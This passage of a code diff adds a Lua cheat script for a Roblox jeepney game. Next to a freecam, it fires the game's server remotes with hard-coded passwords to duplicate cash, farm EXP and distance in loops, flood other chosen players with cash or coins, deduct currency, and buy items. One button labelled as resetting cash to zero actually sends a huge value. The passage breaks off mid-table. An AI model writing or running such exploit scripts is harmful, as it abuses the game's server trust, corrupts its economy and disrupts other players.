+                                local cf = camera.CFrame
+                                camPos = cf.Position
+                                local lv = cf.LookVector
+                                yaw = math.deg(math.atan2(-lv.X, -lv.Z))
+                                pitch = math.deg(math.asin(math.clamp(lv.Y, -1, 1)))
+                                dragModeOn = false
+                                updateLockVisuals()
+                                toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+                                toggleBtn.Text = "Exit Freecam"
+                                task.spawn(function()
+                                    local touchGui = playerGui:FindFirstChild("TouchGui")
+                                    if touchGui then touchGui.Enabled = true end
+                                end)
+                            end
+                        end
+                        state.touch = nil
+                        state.dragging = false
+                    end)
+                end
+                
+                do
+                    local state = {
+                        touch = nil, startPos = nil, startAnchor = nil,
+                        totalDist = 0, dragging = false,
+                    }
+                    lockBtn.InputBegan:Connect(function(input)
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        state.touch = input
+                        state.startPos = Vector2.new(input.Position.X, input.Position.Y)
+                        state.startAnchor = topBar.Position
+                        state.totalDist = 0
+                        state.dragging = false
+                    end)
+                    lockBtn.InputChanged:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        local current = Vector2.new(input.Position.X, input.Position.Y)
+                        state.totalDist = (current - state.startPos).Magnitude
+                        if state.totalDist > TAP_THRESHOLD then
+                            state.dragging = true
+                            local deltaX = input.Position.X - state.startPos.X
+                            local deltaY = input.Position.Y - state.startPos.Y
+                            topBar.Position = UDim2.new(
+                                state.startAnchor.X.Scale,
+                                state.startAnchor.X.Offset + deltaX,
+                                state.startAnchor.Y.Scale,
+                                state.startAnchor.Y.Offset + deltaY
+                            )
+                        end
+                    end)
+                    lockBtn.InputEnded:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        if state.totalDist <= TAP_THRESHOLD then
+                            dragModeOn = not dragModeOn
+                            updateLockVisuals()
+                        end
+                        state.touch = nil
+                        state.dragging = false
+                    end)
+                end
+                
+                do
+                    local state = {
+                        touch = nil, startPos = nil, startAnchor = nil,
+                        totalDist = 0, dragging = false,
+                    }
+                    upBtn.InputBegan:Connect(function(input)
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        state.touch = input
+                        state.startPos = Vector2.new(input.Position.X, input.Position.Y)
+                        state.startAnchor = upBtn.Position
+                        state.totalDist = 0
+                        state.dragging = false
+                        if not dragModeOn then
+                            upHeld = true
+                        end
+                    end)
+                    upBtn.InputChanged:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        local current = Vector2.new(input.Position.X, input.Position.Y)
+                        state.totalDist = (current - state.startPos).Magnitude
+                        if dragModeOn and state.totalDist > TAP_THRESHOLD then
+                            state.dragging = true
+                            upHeld = false
+                            local deltaX = input.Position.X - state.startPos.X
+                            local deltaY = input.Position.Y - state.startPos.Y
+                            upBtn.Position = UDim2.new(
+                                state.startAnchor.X.Scale,
+                                state.startAnchor.X.Offset + deltaX,
+                                state.startAnchor.Y.Scale,
+                                state.startAnchor.Y.Offset + deltaY
+                            )
+                        end
+                    end)
+                    upBtn.InputEnded:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        upHeld = false
+                        state.touch = nil
+                        state.dragging = false
+                    end)
+                end
+                
+                do
+                    local state = {
+                        touch = nil, startPos = nil, startAnchor = nil,
+                        totalDist = 0, dragging = false,
+                    }
+                    downBtn.InputBegan:Connect(function(input)
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        state.touch = input
+                        state.startPos = Vector2.new(input.Position.X, input.Position.Y)
+                        state.startAnchor = downBtn.Position
+                        state.totalDist = 0
+                        state.dragging = false
+                        if not dragModeOn then
+                            downHeld = true
+                        end
+                    end)
+                    downBtn.InputChanged:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        local current = Vector2.new(input.Position.X, input.Position.Y)
+                        state.totalDist = (current - state.startPos).Magnitude
+                        if dragModeOn and state.totalDist > TAP_THRESHOLD then
+                            state.dragging = true
+                            downHeld = false
+                            local deltaX = input.Position.X - state.startPos.X
+                            local deltaY = input.Position.Y - state.startPos.Y
+                            downBtn.Position = UDim2.new(
+                                state.startAnchor.X.Scale,
+                                state.startAnchor.X.Offset + deltaX,
+                                state.startAnchor.Y.Scale,
+                                state.startAnchor.Y.Offset + deltaY
+                            )
+                        end
+                    end)
+                    downBtn.InputEnded:Connect(function(input)
+                        if input ~= state.touch then return end
+                        if input.UserInputType ~= Enum.UserInputType.Touch then return end
+                        downHeld = false
+                        state.touch = nil
+                        state.dragging = false
+                    end)
+                end
+                
+                speedUp.Activated:Connect(function()
+                    camSpeed = math.min(camSpeed + SPEED_STEP, MAX_SPEED)
+                    speedLabel.Text = "Speed: " .. camSpeed
+                end)
+                speedDown.Activated:Connect(function()
+                    camSpeed = math.max(camSpeed - SPEED_STEP, MIN_SPEED)
+                    speedLabel.Text = "Speed: " .. camSpeed
+                end)
+                
+                local function isOnRect(pos, obj)
+                    local ap = obj.AbsolutePosition
+                    local as = obj.AbsoluteSize
+                    return pos.X >= ap.X and pos.X <= ap.X + as.X
+                        and pos.Y >= ap.Y and pos.Y <= ap.Y + as.Y
+                end
+                
+                local function isOnUI(pos)
+                    local elements = {
+                        upBtn, downBtn, lockBtn, speedDown, speedUp, speedPanel,
+                        toggleBtn, topBar,
+                    }
+                    for _, obj in ipairs(elements) do
+                        if isOnRect(pos, obj) then
+                            return true
+                        end
+                    end
+                    local touchGui = playerGui:FindFirstChild("TouchGui")
+                    if touchGui then
+                        local touchFrame = touchGui:FindFirstChild("TouchControlFrame", true)
+                        if touchFrame then
+                            local thumbstick = touchFrame:FindFirstChild("DynamicThumbstickFrame", true)
+                                or touchFrame:FindFirstChild("ThumbstickFrame", true)
+                            if thumbstick and thumbstick:IsA("GuiObject") and isOnRect(pos, thumbstick) then
+                                return true
+                            end
+                        end
+                    end
+                    return false
+                end
+                
+                local function isOnToggleBtn(pos)
+                    return isOnRect(pos, toggleBtn) or isOnRect(pos, topBar)
+                end
+                
+                local function isLeftSide(pos)
+                    local viewSize = camera.ViewportSize
+                    return pos.X < viewSize.X * 0.4
+                end
+                
+                UserInputService.TouchStarted:Connect(function(input, _gameProcessed)
+                    if not freecamOn then return end
+                    local pos = input.Position
+                    if isOnToggleBtn(pos) then return end
+                    if isOnUI(pos) then return end
+                    if isLeftSide(pos) then return end
+                    if not lookTouch then
+                        lookTouch = input
+                        lastLookPos = pos
+                    end
+                end)
+                
+                UserInputService.TouchMoved:Connect(function(input)
+                    if not freecamOn then return end
+                    if input == lookTouch and lastLookPos then
+                        local delta = input.Position - lastLookPos
+                        yaw = yaw - delta.X * LOOK_SENSITIVITY
+                        pitch = math.clamp(pitch - delta.Y * LOOK_SENSITIVITY, -89, 89)
+                        lastLookPos = input.Position
+                    end
+                end)
+                
+                UserInputService.TouchEnded:Connect(function(input)
+                    if input == lookTouch then
+                        lookTouch = nil
+                        lastLookPos = nil
+                    end
+                end)
+                
+                local function getMoveVector()
+                    if controlsModule then
+                        local ok, vec = pcall(function()
+                            return controlsModule:GetMoveVector()
+                        end)
+                        if ok and vec then
+                            return vec
+                        end
+                    end
+                    return Vector3.zero
+                end
+                
+                RunService.RenderStepped:Connect(function(dt)
+                    if not freecamOn then return end
+                    local char = player.Character
+                    if char then
+                        local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+                        local rootPart = char:FindFirstChild("HumanoidRootPart")
+                        if humanoid then
+                            humanoid.WalkSpeed = 0
+                            humanoid.JumpPower = 0
+                            humanoid.JumpHeight = 0
+                        end
+                        if rootPart then
+                            if not rootPart.Anchored then
+                                rootPart.Anchored = true
+                            end
+                            if frozenPosition then
+                                rootPart.AssemblyLinearVelocity = Vector3.zero
+                                rootPart.AssemblyAngularVelocity = Vector3.zero
+                                rootPart.CFrame = frozenPosition
+                            end
+                        end
+                    end
+                    local vertInput = 0
+                    if upHeld then vertInput = vertInput + 1 end
+                    if downHeld then vertInput = vertInput - 1 end
+                    local moveVector = getMoveVector()
+                    local rotation = CFrame.Angles(0, math.rad(yaw), 0)
+                        * CFrame.Angles(math.rad(pitch), 0, 0)
+                    local right = rotation.RightVector
+                    local fwd = rotation.LookVector
+                    local move = (right * moveVector.X)
+                        + (fwd * -moveVector.Z)
+                        + (Vector3.yAxis * vertInput)
+                    camPos = camPos + move * camSpeed * dt
+                    camera.CameraType = Enum.CameraType.Scriptable
+                    camera.CFrame = CFrame.new(camPos) * rotation
+                end)
+                
+                player.CharacterAdded:Connect(function()
+                    if freecamOn then
+                        task.wait(0.5)
+                        camera.CameraType = Enum.CameraType.Scriptable
+                        local char = player.Character
+                        if char then
+                            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+                            local rootPart = char:FindFirstChild("HumanoidRootPart")
+                            if humanoid then
+                                origWalkSpeed = humanoid.WalkSpeed
+                                origJumpPower = humanoid.JumpPower
+                                origJumpHeight = humanoid.JumpHeight
+                                humanoid.WalkSpeed = 0
+                                humanoid.JumpPower = 0
+                                humanoid.JumpHeight = 0
+                                humanoid:Move(Vector3.zero, false)
+                            end
+                            if rootPart then
+                                frozenPosition = rootPart.CFrame
+                                rootPart.AssemblyLinearVelocity = Vector3.zero
+                                rootPart.AssemblyAngularVelocity = Vector3.zero
+                                rootPart.Anchored = true
+                                rootPart.CFrame = frozenPosition
+                            end
+                        end
+                    end
+                end)
+            end)
+        else
+            if freecamGui then
+                freecamGui:Destroy()
+                freecamGui = nil
+                local camera = workspace.CurrentCamera
+                camera.CameraType = Enum.CameraType.Custom
+                local player = game.Players.LocalPlayer
+                if player.Character then
+                    local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
+                    local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                    if rootPart then
+                        rootPart.Anchored = false
+                    end
+                end
+            end
+        end
+    end
+})
+
+local ShopSection1 = ShopTab:AddSection("Jeepney Shop")
+ShopSection1:AddButton({
+    Title = "Sarao Custombuilt",
+    Description = "Buy Sarao Custombuilt Jeepney",
+    Callback = function()
+        local args = { [1] = { ["JeepneyName"] = "Sarao Custombuilt Model 2", ["Password"] = 127731731 } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("BuyJeepney", 9e9):InvokeServer(unpack(args))
+    end
+})
+
+ShopSection1:AddButton({
+    Title = "DF Devera Long",
+    Description = "Buy DF Devera Long Model",
+    Callback = function()
+        local args = { [1] = { ["JeepneyName"] = "DF Devera Long Model", ["Password"] = 127731731 } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("BuyJeepney", 9e9):InvokeServer(unpack(args))
+    end
+})
+
+ShopSection1:AddButton({
+    Title = "Morales 10 Seater",
+    Description = "Buy Morales 10 Seater",
+    Callback = function()
+        local args = { [1] = { ["JeepneyName"] = "Morales 10 Seater", ["Password"] = 127731731 } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("BuyJeepney", 9e9):InvokeServer(unpack(args))
+    end
+})
+
+ShopSection1:AddButton({
+    Title = "Milwaukee 11 Seater",
+    Description = "Buy Milwaukee Motor Sport",
+    Callback = function()
+        local args = { [1] = { ["JeepneyName"] = "Milwaukee Motor Sport 11 Seater", ["Password"] = 127731731 } }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("BuyJeepney", 9e9):InvokeServer(unpack(args))
+    end
+})
+
+local ShopSection2 = ShopTab:AddSection("Tools")
+local function buyTool(toolName)
+    local args = { [1] = { ["ToolName"] = toolName, ["Password"] = 127731731 } }
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("BuyTool", 9e9):InvokeServer(unpack(args))
+end
+
+ShopSection2:AddButton({ Title = "Diesel Can", Description = "Buy Diesel Can", Callback = function() buyTool("Diesel can") end })
+ShopSection2:AddButton({ Title = "Wrench", Description = "Buy Wrench", Callback = function() buyTool("Wrench") end })
+ShopSection2:AddButton({ Title = "Baseball Bat", Description = "Buy Baseball Bat", Callback = function() buyTool("Baseball bat") end })
+ShopSection2:AddButton({ Title = "Metal Pipe", Description = "Buy Metal Pipe", Callback = function() buyTool("Metal pipe") end })
+ShopSection2:AddButton({ Title = "Hammer", Description = "Buy Hammer", Callback = function() buyTool("Hammer") end })
+ShopSection2:AddButton({ Title = "Coolant Can", Description = "Buy Coolant Can", Callback = function() buyTool("coolant can") end })
+
+local ShopSection3 = ShopTab:AddSection("Food")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local function buyFood(foodName)
+    local args = { [1] = { ["Password"] = 806253536, ["FoodName"] = foodName } }
+    ReplicatedStorage:WaitForChild("Remotes", 9e9):WaitForChild("BuyFood", 9e9):InvokeServer(unpack(args))
+end
+
+ShopSection3:AddButton({ Title = "Hotdog", Description = "Buy Hotdog", Callback = function() buyFood("Hotdog") end })
+ShopSection3:AddButton({ Title = "Water", Description = "Buy Water", Callback = function() buyFood("Water") end })
+ShopSection3:AddButton({ Title = "Fried Chicken", Description = "Buy Fried Chicken", Callback = function() buyFood("Fried Chicken") end })
+ShopSection3:AddButton({ Title = "Bloxy Cola", Description = "Buy Bloxy Cola", Callback = function() buyFood("Bloxy Cola") end })
+ShopSection3:AddButton({ Title = "Betamax", Description = "Buy Betamax", Callback = function() buyFood("Betamax") end })
+ShopSection3:AddButton({ Title = "Quek Quek", Description = "Buy Quek Quek", Callback = function() buyFood("Quek Quek") end })
+
+local MainSection1 = MainTab:AddSection("EXP")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local isRunning = false
+local expLoop
+
+MainSection1:AddToggle({
+    Title = "Auto EXP",
+    Description = "Automatic Gain Exp When ON",
+    Default = false,
+    Callback = function(state)
+        isRunning = state
+        if state then
+            local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("UnloadPassenger", 9e9)
+            local Passengers = workspace:WaitForChild("Passengers", 9e9)
+            local Jeepney = workspace:WaitForChild("Jeepnies", 9e9):WaitForChild(LocalPlayer.Name, 9e9)
+            local Seat = Jeepney:WaitForChild("Body", 9e9):WaitForChild("FunctionalStuff", 9e9):WaitForChild("Seats", 9e9):GetChildren()[14]
+            local SpawnPoints = workspace:WaitForChild("Map", 9e9):WaitForChild("Misc", 9e9):WaitForChild("PassengerSpawnPoints", 9e9)
+            local function getRandomSpawnPoint()
+                local folder = SpawnPoints:GetChildren()
+                local randomFolder = folder[math.random(1, #folder)]
+                local points = randomFolder:GetChildren()
+                return points[math.random(1, #points)]
+            end
+            expLoop = task.spawn(function()
+                while isRunning do
+                    for i = 1, expMultiplier do
+                        pcall(function()
+                            local Passenger = Passengers:GetChildren()
+                            if #Passenger > 0 then
+                                local args = { [1] = { ["Password"] = 826272728262, ["Passenger"] = Passenger[math.random(1, #Passenger)], ["Jeepney"] = Jeepney, ["Seat"] = Seat, ["Destination"] = getRandomSpawnPoint() } }
+                                Remote:FireServer(unpack(args))
+                            end
+                        end)
+                    end
+                    task.wait(0.5)
+                end
+            end)
+        else
+            if expLoop then
+                task.cancel(expLoop)
+            end
+        end
+    end
+})
+
+local manualGainEnabled = false
+MainSection1:AddToggle({
+    Title = "Manual Gain",
+    Description = "Manually Gain Exp When ON",
+    Default = false,
+    Callback = function(state)
+        manualGainEnabled = state
+    end
+})
+
+local MainSection9 = MainTab:AddSection("Km")
+local isAutoKmActive = false
+local autoKmLoop = nil
+
+MainSection9:AddToggle({
+    Title = "Auto Km",
+    Description = "Automatic Gain Km While in Jeep",
+    Default = false,
+    Callback = function(state)
+        isAutoKmActive = state
+        if state then
+            autoKmLoop = task.spawn(function()
+                while isAutoKmActive do
+                    pcall(function()
+                        local player = game.Players.LocalPlayer
+                        local char = player.Character
+                        if char then
+                            local hum = char:FindFirstChild("Humanoid")
+                            if hum and hum.SeatPart then
+                                local car = hum.SeatPart.Parent
+                                if car and car:FindFirstChild("Body") then
+                                    local body = car.Body
+                                    if body:FindFirstChild("#Weight") then
+                                        body.PrimaryPart = body["#Weight"]
+                                    end
+                                    local carPrimaryPart = car.PrimaryPart or (body and body["#Weight"])
+                                    
+                                    if carPrimaryPart then
+                                        local location1 = Vector3.new(-589929299282829, 74, -2940)
+                                        local location2 = Vector3.new(-2827827282682, 74, 3171)
+                                        
+                                        while isAutoKmActive do
+                                            repeat
+                                                if not isAutoKmActive then break end
+                                                task.wait()
+                                                carPrimaryPart.Velocity = carPrimaryPart.CFrame.LookVector * 5000
+                                                car:PivotTo(CFrame.new(carPrimaryPart.Position, location1))
+                                            until (char.PrimaryPart.Position - location1).Magnitude < 50 or not isAutoKmActive
+                                            
+                                            if not isAutoKmActive then break end
+                                            carPrimaryPart.Velocity = Vector3.new(0,0,0)
+                                            task.wait(1)
+                                            
+                                            repeat
+                                                if not isAutoKmActive then break end
+                                                task.wait()
+                                                carPrimaryPart.Velocity = carPrimaryPart.CFrame.LookVector * 5000
+                                                car:PivotTo(CFrame.new(carPrimaryPart.Position, location2))
+                                            until (char.PrimaryPart.Position - location2).Magnitude < 50 or not isAutoKmActive
+                                            
+                                            if not isAutoKmActive then break end
+                                            carPrimaryPart.Velocity = Vector3.new(0,0,0)
+                                            task.wait(1)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                end
+            end)
+        else
+            if autoKmLoop then
+                task.cancel(autoKmLoop)
+                autoKmLoop = nil
+                pcall(function()
+                    local player = game.Players.LocalPlayer
+                    local char = player.Character
+                    if char then
+                        local hum = char:FindFirstChild("Humanoid")
+                        if hum and hum.SeatPart then
+                            local car = hum.SeatPart.Parent
+                            if car and car:FindFirstChild("Body") then
+                                local body = car.Body
+                                if body:FindFirstChild("#Weight") then
+                                    local carPrimaryPart = body["#Weight"]
+                                    carPrimaryPart.Velocity = Vector3.new(0,0,0)
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end
+})
+
+local MainSection2 = MainTab:AddSection("Duper")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local RecieveCash = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("RecieveCash")
+local baseValue = 100
+local delaySeconds = 0.5
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CashFarmGUI"
+ScreenGui.Parent = PlayerGui
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Enabled = false
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 200, 0, 80)
+Frame.Position = UDim2.new(0.5, -100, 0, 20)
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 0.3
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = Frame
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Thickness = 1.5
+Stroke.Color = Color3.fromRGB(255, 255, 255)
+Stroke.Transparency = 0.5
+Stroke.Parent = Frame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0.4, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "CASH FARM"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextTransparency = 0.2
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.Parent = Frame
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(1, -20, 0.5, 0)
+ToggleBtn.Position = UDim2.new(0, 10, 0.45, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+ToggleBtn.BackgroundTransparency = 0.3
+ToggleBtn.Text = "OFF"
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.TextTransparency = 0.1
+ToggleBtn.TextScaled = true
+ToggleBtn.Font = Enum.Font.Gotham
+ToggleBtn.BorderSizePixel = 0
+ToggleBtn.Parent = Frame
+
+local BtnCorner = Instance.new("UICorner")
+BtnCorner.CornerRadius = UDim.new(0, 8)
+BtnCorner.Parent = ToggleBtn
+
+local BtnStroke = Instance.new("UIStroke")
+BtnStroke.Thickness = 1
+BtnStroke.Color = Color3.fromRGB(255, 255, 255)
+BtnStroke.Transparency = 0.6
+BtnStroke.Parent = ToggleBtn
+
+local enabled = false
+local dragging = false
+local dragOffset = Vector2.new()
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragOffset = Vector2.new(input.Position.X - Frame.AbsolutePosition.X, input.Position.Y - Frame.AbsolutePosition.Y)
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
+        local newPos = UDim2.new(0, input.Position.X - dragOffset.X, 0, input.Position.Y - dragOffset.Y)
+        Frame.Position = newPos
+    end
+end)
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    enabled = not enabled
+    if enabled then
+        ToggleBtn.Text = "ON"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(80, 255, 80)
+    else
+        ToggleBtn.Text = "OFF"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        if enabled then
+            for i = 1, dupeMultiplier do
+                pcall(function()
+                    RecieveCash:FireServer({
+                        Value = baseValue,
+                        Password = 93828272827
+                    })
+                end)
+            end
+            task.wait(delaySeconds)
+        else
+            task.wait(0.5)
+        end
+    end
+end)
+
+MainSection2:AddToggle({
+    Title = "Dupe Cash",
+    Description = "Open and Close The Dupe Cash Gui",
+    Default = false,
+    Callback = function(state)
+        ScreenGui.Enabled = state
+    end
+})
+
+local MainSection3 = MainTab:AddSection("Send")
+local cashRunning = false
+local cashThreads = {}
+local cashMultiplier = 100
+local coinLoop = nil
+local selectedTargetPlayer = nil
+
+local function refreshPlayerList()
+    local players = {}
+    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+        if player.Name ~= game.Players.LocalPlayer.Name then
+            table.insert(players, player.Name)
+        end
+    end
+    return players
+end
+
+MainSection3:AddDropdown({
+    Title = "Select Target Player",
+    Description = "Choose a player to send to",
+    Values = refreshPlayerList(),
+    Default = #refreshPlayerList() > 0 and refreshPlayerList()[1] or "No players",
+    Callback = function(value)
+        selectedTargetPlayer = value
+        if value and value ~= "" and value ~= "No players" then
+            baryaViewer.Enabled = true
+            local success, result = pcall(function()
+                local barya = game:GetService("Players")[value].stats.Barya.Value
+                baryaText.Text = "Target Barya: " .. tostring(barya)
+                game:GetService("Players")[value].stats.Barya:GetPropertyChangedSignal("Value"):Connect(function()
+                    if game:GetService("Players")[value] then
+                        baryaText.Text = "Target Barya: " .. tostring(game:GetService("Players")[value].stats.Barya.Value)
+                    end
+                end)
+            end)
+            if not success then
+                baryaText.Text = "Target Barya: Not Found"
+            end
+        else
+            baryaViewer.Enabled = false
+        end
+    end
+})
+
+MainSection3:AddButton({
+    Title = "Refresh Player List",
+    Description = "Update the list of available players",
+    Callback = function()
+        print("Player list refreshed")
+    end
+})
+
+MainSection3:AddToggle({
+    Title = "Send Cash Inf",
+    Description = "Infinitely send cash to target player",
+    Default = false,
+    Callback = function(state)
+        cashRunning = state
+        if state then
+            if not selectedTargetPlayer then
+                warn("Please select a target player first")
+                return
+            end
+            local Players = game:GetService("Players")
+            local r = game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9)
+            local targetPlayer = Players:FindFirstChild(selectedTargetPlayer)
+            if not targetPlayer then
+                warn("Target player not found: " .. selectedTargetPlayer)
+                return
+            end
+            for i = 1, cashMultiplier do
+                local thread = task.spawn(function()
+                    while cashRunning do
+                        for j = 1, cashMultiplier do
+                            pcall(function()
+                                local args = { [1] = { ["Value"] = selectedCashValue, ["OtherPlayer"] = targetPlayer, ["Password"] = 711120457 } }
+                                r.SendCash:InvokeServer(unpack(args))
+                            end)
+                        end
+                        for k = 1, cashMultiplier do
+                            pcall(function()
+                                local checkArgs = { [1] = { ["Value"] = selectedCashValue, ["OtherPlayer"] = targetPlayer, ["Password"] = 711120457 } }
+                                r.CheckCash:InvokeServer(unpack(checkArgs))
+                            end)
+                        end
+                        task.wait(0.01)
+                    end
+                end)
+                table.insert(cashThreads, thread)
+            end
+        else
+            cashThreads = {}
+        end
+    end
+})
+
+MainSection3:AddToggle({
+    Title = "Send Coin Inf",
+    Description = "Infinitely send coins to target player",
+    Default = false,
+    Callback = function(state)
+        if state then
+            if not selectedTargetPlayer then
+                warn("Please select a target player first")
+                return
+            end
+            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
+            if remote then
+                local sendCoin = remote:FindFirstChild("SendCoin")
+                if sendCoin then
+                    local targetPlayer = game:GetService("Players"):FindFirstChild(selectedTargetPlayer)
+                    if not targetPlayer then
+                        warn("Target player not found: " .. selectedTargetPlayer)
+                        return
+                    end
+                    coinLoop = task.spawn(function()
+                        while state do
+                            for j = 1, 50 do
+                                pcall(function()
+                                    sendCoin:FireServer({ ["Value"] = selectedCoinValue, ["OtherPlayer"] = targetPlayer, ["Password"] = 801987673 })
+                                end)
+                            end
+                            task.wait(0.01)
+                        end
+                    end)
+                end
+            end
+        else
+            if coinLoop then
+                task.cancel(coinLoop)
+                coinLoop = nil
+            end
+        end
+    end
+})
+
+local MainSection4 = MainTab:AddSection("Deduct")
+
+local deductValue = 0
+
+MainSection4:AddInput({
+    Title = "Removing Value",
+    Description = "Enter amount to deduct",
+    PlaceHolder = "0",
+    Default = "0",
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            deductValue = num
+        end
+    end
+})
+
+MainSection4:AddButton({
+    Title = "Remove Exp",
+    Description = "Remove EXP from player",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["Value"] = deductValue,
+                ["Password"] = 704466797
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("DeductExp", 9e9):FireServer(unpack(args))
+    end
+})
+
+MainSection4:AddButton({
+    Title = "Remove Cash",
+    Description = "Remove Cash from player",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["Value"] = deductValue,
+                ["Password"] = 704466797
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("DeductCash", 9e9):FireServer(unpack(args))
+    end
+})
+
+local MainSection5 = MainTab:AddSection("Reset")
+MainSection5:AddButton({
+    Title = "Reset Cash",
+    Description = "Reseting Cash To 0",
+    Callback = function()
+        local args = { [1] = { ["Password"] = 170401597, ["Value"] = 100000000000 } }
+        game:GetService("ReplicatedStorage"):FindFirstChild("Remotes"):FindFirstChild("RecieveOnHoldCash"):FireServer(unpack(args))
+    end
+})
+
+local MainSection6 = MainTab:AddSection("Jeep Spawner")
+MainSection6:AddButton({
+    Title = "Spawn Jeep",
+    Description = "Spawn your jeep from garage",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["Garage"] = workspace:WaitForChild("Map", 9e9):WaitForChild("Misc", 9e9):WaitForChild("Garages", 9e9):WaitForChild("67 Matungao st., Matungao, Bulakan, Bulacan", 9e9),
+                ["Password"] = 948201786,
+                ["JeepneyName"] = selectedJeepney,
+                ["Route"] = selectedRoute,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("SpawnJeepney", 9e9):FireServer(unpack(args))
+    end
+})
+
+local MainSection7 = MainTab:AddSection("Rent Jeep")
+MainSection7:AddButton({
+    Title = "Rent Unit",
+    Description = "Rent the jeep unit selected in Settings",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["UnitName"] = selectedUnit,
+                ["JeepneyName"] = "Sarao Custombuilt Model 2",
+                ["OperatorNpc"] = workspace:WaitForChild("Map", 9e9):WaitForChild("Misc", 9e9):WaitForChild("Operators", 9e9):WaitForChild("Mang Juan", 9e9),
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("SpawnOperatorNPCJeepney", 9e9):FireServer(unpack(args))
+    end
+})
+
+local MainSection8 = MainTab:AddSection("Parts")
+local selectedPartsJeep = "Sarao Custombuilt Model 2_#1"
+local partsJeepOptions = { "Sarao Custombuilt Model 2", "DF Devera Long Model", "Morales 10 Seater", "Milwaukee Motor Sport 11 Seater" }
+
+MainSection8:AddDropdown({
+    Title = "Select Jeep",
+    Description = "Choose which jeep to max out parts",
+    Values = partsJeepOptions,
+    Default = "Sarao Custombuilt Model 2",
+    Callback = function(value)
+        if value == "Sarao Custombuilt Model 2" then
+            selectedPartsJeep = "Sarao Custombuilt Model 2_#1"
+        elseif value == "DF Devera Long Model" then
+            selectedPartsJeep = "DF Devera Long Model_#1"
+        elseif value == "Morales 10 Seater" then
+            selectedPartsJeep = "Morales 10 Seater_#1"
+        elseif value == "Milwaukee Motor Sport 11 Seater" then
+            selectedPartsJeep = "Milwaukee Motor Sport 11 Seater_#1"
+        end
+    end
+})
+
+MainSection8:AddButton({
+    Title = "Max All Jeep Parts",
+    Description = "Set all parts to 100% for selected jeep",
+    Callback = function()
+        local args = {
+            [1] = {
+                ["Password"] = 864541710,
+                ["NewOwnedParts"] = {
+                    ["BA - 05"] = 100, ["BA - 01"] = 100, ["BA - 03"] = 100, ["T - 02 (R)"] = 100,
